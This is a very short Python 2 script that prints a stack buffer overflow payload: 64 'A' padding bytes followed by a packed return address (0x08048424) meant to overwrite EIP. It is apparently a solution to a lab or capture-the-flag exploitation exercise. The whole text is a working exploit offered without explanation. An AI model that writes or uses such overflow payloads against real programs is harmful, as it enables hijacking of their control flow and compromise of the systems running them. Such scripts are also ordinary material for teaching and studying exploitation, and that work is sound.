import struct

offset = "A" * 64
eip = struct.pack("I", 0x08048424)

print offset + eip